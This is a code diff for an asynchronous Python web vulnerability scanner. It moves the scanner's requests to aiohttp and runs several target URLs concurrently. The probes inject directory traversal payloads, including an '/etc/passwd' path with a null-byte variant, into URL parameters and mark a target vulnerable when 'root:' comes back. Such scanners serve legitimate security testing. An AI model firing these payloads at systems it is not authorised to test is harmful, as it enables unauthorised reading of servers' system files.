@@ -22,7 +22,6 @@ VERBOSE = "1"
 async def active_scan(
     session, full_url, base_url, http_length_base, payload, username=None
 ):
-    result_list = []
     verbose = "y"
     new_url = base_url
 
@@ -416,6 +415,7 @@ async def active_scan(
     traversal_url = new_url.replace("INJECTX", traversal_exploit)
     sub_path = traversal_url.split(target)[1]
 
+    res_direc_traversal = await session.get(traversal_url)
     try:
 
         http_response = str(await res_direc_traversal.read())
@@ -446,19 +446,20 @@ async def active_scan(
 
     # Linux Directory Traversal ######################################################################################
     result_string = "benign"
-    try:
-        traversal_exploit = (
+    traversal_exploit = (
             "/../../../../../../../../../../../../../../../../../etc/passwd"
         )
 
-        traversal_url = new_url.replace("INJECTX", traversal_exploit)
-        sub_path = traversal_url.split(target)[1]
+    traversal_url = new_url.replace("INJECTX", traversal_exploit)
+    sub_path = traversal_url.split(target)[1]
 
-        http_request = urllib.request.urlopen(traversal_url)
-        http_response = str(http_request.read())
+    res_direc_traversal = await session.get(traversal_url)
+    try:
+        
+        http_response = str(await res_direc_traversal.read())
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
-        http_status = http_request.getcode()
+        http_status = res_direc_traversal.status
 
         if "root:" in http_response:
             result_string = "vulnerable"
@@ -483,19 +484,20 @@ async def active_scan(
 
     # Linux Directory Traversal 2 ######################################################################################
     result_string = "benign"
-    try:
-        traversal_exploit = (
+    traversal_exploit = (
             "/../../../../../../../../../../../../../../../../../etc/passwd%00"
         )
 
-        traversal_url = new_url.replace("INJECTX", traversal_exploit)
-        sub_path = traversal_url.split(target)[1]
-
-        http_request = urllib.request.urlopen(traversal_url)
-        http_response = str(http_request.read())
+    traversal_url = new_url.replace("INJECTX", traversal_exploit)
+    sub_path = traversal_url.split(target)[1]
+    
+    res_direc_traversal = await session.get(traversal_url)
+    try:
+        
+        http_response = str(await res_direc_traversal.read())
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
-        http_status = http_request.getcode()
+        http_status = res_direc_traversal.status
 
         if "root:" in http_response:
             result_string = "vulnerable"
@@ -567,7 +569,7 @@ async def active_scan(
     try:
 
         # http_request = urllib.request.urlopen(rfi_url)
-        http_response = str(await rfi_url.read())
+        http_response = str(await res_rfi.read())
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = res_rfi.status
@@ -1035,12 +1037,10 @@ async def active_scan(
     except:
         pass
 
-    return result_list
 
 
 async def main(url, cookies="", session=None, username=None):
     print("scanning {} ...".format(url))
-    result_list = []
     full_url = str(url)
     payload = "INJECTX"
     http_status_base = "404"
@@ -1098,7 +1098,7 @@ async def main(url, cookies="", session=None, username=None):
                         base_url += param_list[i - 1] + payload
                         active_fuzz = active_fuzz + 1
                         i = i + 1
-                        result_list += await active_scan(
+                        await active_scan(
                             session,
                             full_url,
                             base_url,
@@ -1112,7 +1112,7 @@ async def main(url, cookies="", session=None, username=None):
                         base_url += param_list[i - 1] + param_vals[i - 1]
                         active_fuzz = active_fuzz + 1
                         i = 1
-                        result_list += await active_scan(
+                        await active_scan(
                             session,
                             full_url,
                             base_url,
@@ -1126,7 +1126,7 @@ async def main(url, cookies="", session=None, username=None):
                         base_url += param_list[i - 1] + param_vals[i - 1]
                         active_fuzz = active_fuzz + 1
                         i = 1
-                        result_list += await active_scan(
+                        await active_scan(
                             session,
                             full_url,
                             base_url,
@@ -1443,12 +1443,13 @@ async def main(url, cookies="", session=None, username=None):
                 traversal_url = new_url.replace("INJECTX", traversal_exploit)
                 sub_path = traversal_url.split(target)[1]
 
+                
                 try:
-                    http_request = urllib.request.urlopen(traversal_url)
-                    http_response = str(http_request.read())
+                    trav_res = await session.get(traversal_url)
+                    http_response = str(trav_res.read())
                     http_length = len(http_response)
                     http_length_diff = str(http_length_base - http_length)
-                    http_status = http_request.getcode()
+                    http_status = trav_res.status
 
                     if "root:" in http_response:
                         result_string = "vulnerable"
@@ -1483,11 +1484,11 @@ async def main(url, cookies="", session=None, username=None):
                 sub_path = traversal_url.split(target)[1]
 
                 try:
-                    http_request = urllib.request.urlopen(traversal_url)
-                    http_response = str(http_request.read())
+                    trav_res = await session.get(traversal_url)
+                    http_response = str(trav_res.read())
                     http_length = len(http_response)
                     http_length_diff = str(http_length_base - http_length)
-                    http_status = http_request.getcode()
+                    http_status = trav_res.status
 
                     if "root:" in http_response:
                         result_string = "vulnerable"
@@ -1510,9 +1511,12 @@ async def main(url, cookies="", session=None, username=None):
                 except:
                     pass
 
-        return result_list
 
-
-async def wrapperMain(url, cookies="", session=None, username=None):
+async def wrapperMain(urlList, cookies="", session=None, username=None):
     async with ClientSession() as session:
-        return await main(url=url, session=session, username=username)
+        global result_list
+        result_list = []
+        futures = [asyncio.ensure_future(main(url=url, session=session, username=username))
+                   for url in urlList]
+        res = await asyncio.gather(*futures)
+        return result_list
